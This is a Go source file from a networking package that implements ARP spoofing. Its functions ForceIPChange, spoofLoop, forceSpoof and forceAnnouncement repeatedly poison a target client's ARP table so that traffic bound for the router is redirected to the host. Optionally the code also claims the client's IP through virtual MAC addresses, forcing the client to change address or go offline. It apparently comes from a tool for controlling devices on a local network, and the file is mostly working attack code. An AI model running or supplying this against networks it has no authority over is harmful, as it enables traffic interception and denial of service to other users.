package arp

import (
	"context"
	"fmt"
	"net"
	"time"

	"log"
)

// ForceIPChange performs the following:
//  1. set client state to "hunt" which will continuously spoof the client ARP table
//  2. create a virtual host for each IP and claim the IP
//  3. spoof the client ARP table to redirect all traffic to host
//  4. claim the client IP to force client to reaquire DHCP
//  5. notify when client change IP
//
// client will revert back to "normal" when a new IP is detected for the MAC
func (c *Handler) ForceIPChange(mac net.HardwareAddr, claimIP bool) error {
	if Debug {
		log.Printf("ARP force IP change mac=%s", mac)
	}

	c.Lock()
	client := c.table.findByMAC(mac)
	if client == nil || !client.Online || client.State == StateVirtualHost {
		err := fmt.Errorf("mac %s is not online", mac)
		c.Unlock()
		return err
	}

	if client.State == StateHunt {
		err := fmt.Errorf("mac %s already in hunt state", mac)
		c.Unlock()
		return err
	}

	client.State = StateHunt
	client.ClaimIP = claimIP
	ips := client.IPs()
	c.Unlock()

	// one virtual mac per IP
	for _, v := range ips {
		go c.spoofLoop(c.ctx, client, v)
	}

	return nil
}

// StopIPChange terminate the hunting process
func (c *Handler) StopIPChange(mac net.HardwareAddr) error {
	if Debug {
		log.Printf("ARP stop IP change mac=%s", mac)
	}

	c.Lock()
	defer c.Unlock()

	client := c.table.findByMAC(mac)
	if client == nil {
		err := fmt.Errorf("mac %s not found", mac)
		return err
	}

	if client.State != StateHunt {
		err := fmt.Errorf("not in hunt state mac=%s state=%s", mac, client.State)
		if Debug {
			log.Printf("ARP %s", err)
		}
		return err
	}

	// This will end the spoof goroutine
	client.State = StateNormal
	client.ClaimIP = false
	return nil
}

// ClaimIP creates a virtual host to claim the ip
// When a virtual host exist, the handler will respond to ACD and request packets for the ip
func (c *Handler) ClaimIP(ip net.IP) {
	c.Lock()
	if virtual := c.table.findVirtualIP(ip); virtual == nil {
		virtual, _ = c.table.upsert(StateVirtualHost, newVirtualHardwareAddr(), ip)
		virtual.Online = false // indicates spoof goroutine is not running
	}
	c.Unlock()
}

// IPChanged is used to notify that the IP has changed.
//
// The package will detect IP changes automatically however some clients do not
// send ARP Collision Detection packets and hence do not appear as an immediate change.
// This method is used to accelerate the change for example when a
// new DHCP MACEntry has been allocated.
//
func (c *Handler) IPChanged(mac net.HardwareAddr, clientIP net.IP) {
	// Do nothing if we already have this mac and ip
	c.RLock()
	if client := c.table.findByMAC(mac); client != nil && client.Online && client.IP().Equal(clientIP) {
		c.RUnlock()
		return
	}
	c.RUnlock()

	if Debug {
		log.Printf("ARP ip%s validating for mac=%s", clientIP, mac)
	}
	if err := c.Request(c.config.HostMAC, c.config.HostIP, EthernetBroadcast, clientIP); err != nil {
		log.Printf("ARP request failed mac=%s: %s", mac, err)
	}

	go func() {
		for i := 0; i < 5; i++ {
			time.Sleep(time.Second * 1)
			c.RLock()
			if entry := c.table.findByMAC(mac); entry != nil && entry.IP().Equal(clientIP) {
				c.RUnlock()
				if Debug {
					log.Printf("ARP ip=%s found for mac=%s ips=%s", entry.IP(), entry.MAC, entry.IPs())
				}
				return
			}
			c.RUnlock()

			// Silent request
			if err := c.request(c.config.HostMAC, c.config.HostIP, EthernetBroadcast, clientIP); err != nil {
				log.Printf("ARP request 2 failed mac=%s ip=%s: %s", mac, clientIP, err)
			}
		}
		log.Printf("ARP ip=%s not detect for mac=%s", clientIP, mac)

		c.RLock()
		c.table.printTable()
		c.RUnlock()
	}()
}

// spoofLoop attacks the client with ARP attacks
//
// It will continuously send a number of ARP packets to client:
//   1. spoof the client arp table to send router packets to us
//   2. optionally, claim the ownership of the IP to force client to change IP or go offline
//
func (c *Handler) spoofLoop(ctx context.Context, client *MACEntry, ip net.IP) {

	// create a virtual host and move IPs to it
	// Virtual Host will exist until they get deleted by the purge goroutine
	var virtual *MACEntry
	c.Lock()
	if client.ClaimIP {
		virtual = c.table.findVirtualIP(ip)

		// Online virtual hosts are still running in a goroutine
		if virtual != nil && virtual.Online {
			c.Unlock()
			return
		}

		if virtual == nil {
			virtual, _ = c.table.upsert(StateVirtualHost, newVirtualHardwareAddr(), ip)
		}
		virtual.Online = true // online indicates goroutine is running
	}
	mac := client.MAC
	c.Unlock()

	// 4 second re-arp seem to be adequate;
	// Experimented with 300ms but no noticeable improvement other the chatty net.
	ticker := time.NewTicker(time.Second * 4).C
	startTime := time.Now()
	nTimes := 0
	log.Printf("ARP attack ip=%s client=%s time=%v", ip, mac, startTime)
	for {
		c.Lock()
		// Always search for MAC in case it has been deleted.
		client := c.table.findByMAC(mac)
		if client == nil || client.State != StateHunt {
			log.Printf("ARP attack end ip=%s client=%s repeat=%v duration=%v", ip, mac, nTimes, time.Now().Sub(startTime))
			if virtual != nil {
				virtual.Online = false // goroutine ended
			}
			c.Unlock()
			/** This causes a network lock up - why? all routes and arp table lose state
				// Restore target ARP table to default gw
			if c.routerEntry.MAC != nil {
				c.announce(mac, c.routerEntry.MAC, c.config.RouterIP, EthernetBroadcast, 2)
			}
			***/
			return
		}

		if virtual != nil {
			virtual.LastUpdated = time.Now()
		}

		c.Unlock()

		// Re-arp target to change router to host so all traffic comes to us
		// i.e. tell target I am 192.168.0.1
		//
		// Use virtual IP as it is guaranteed to not change.
		c.forceSpoof(mac, ip)

		// Use VirtualHost to claim ownership of the IP and force target to acquire another IP
		if virtual != nil && nTimes < 5 {
			c.forceAnnouncement(mac, virtual.MAC, ip)
		}

		if nTimes%16 == 0 {
			log.Printf("ARP attack ip=%s client=%s repeat=%v duration=%v", ip, mac, nTimes, time.Now().Sub(startTime))
		}
		nTimes++

		select {
		case <-ctx.Done():
			return
		case <-ticker:
		}
	}
}

// forceSpoof send announcement and gratuitous ARP packet to spoof client MAC arp table to send router packets to
// host instead of the router
// i.e.  192.168.0.1->RouterMAC becames 192.168.0.1->HostMAC
//
// The client ARP table is refreshed often and only last for a short while (few minutes)
// hence the goroutine that re-arp clients
// To make sure the cache stays poisoned, replay every 5 seconds with a loop.
func (c *Handler) forceSpoof(mac net.HardwareAddr, ip net.IP) error {

	// Announce to target that we own the router IP
	// This will update the target arp table with our mac
	err := c.announce(mac, c.config.HostMAC, c.config.RouterIP, EthernetBroadcast, 2)
	if err != nil {
		log.Printf("ARP error send announcement packet mac=%s ip=%s: %s", mac, ip, err)
		return err
	}

	// Send 3 unsolicited ARP reply; clients may discard this
	for i := 0; i < 2; i++ {
		err = c.reply(mac, c.config.HostMAC, c.config.RouterIP, mac, ip)
		if err != nil {
			log.Printf("ARP error spoof client mac=%s ip=%s: %s", mac, ip, err)
			return err
		}
		time.Sleep(time.Millisecond * 10)
	}

	return nil
}

// forceAnnounce send a ARP packets to tell the network we are using the IP.
func (c *Handler) forceAnnouncement(dstEther net.HardwareAddr, mac net.HardwareAddr, ip net.IP) error {
	err := c.announce(dstEther, mac, ip, EthernetBroadcast, 4) // many repeats to force client to reaquire IP
	if err != nil {
		log.Printf("ARP error send announcement packet mac=%s ip=%s: %s", mac, ip, err)
	}

	// Send gratuitous ARP replies : Log the first one only
	// err = c.Reply(mac, ip, EthernetBroadcast, ip) // Send broadcast gratuitous ARP reply
	err = c.reply(dstEther, mac, ip, EthernetBroadcast, ip) // Send gratuitous ARP reply - unicast to target
	for i := 0; i < 3; i++ {
		if err != nil {
			log.Printf("ARP error send gratuitous packet mac=%s ip=%s: %s", mac, ip, err)
		}
		time.Sleep(time.Millisecond * 10)

		// Dont show in log
		err = c.reply(dstEther, mac, ip, EthernetBroadcast, ip) // Send gratuitous ARP reply
	}

	return nil
}
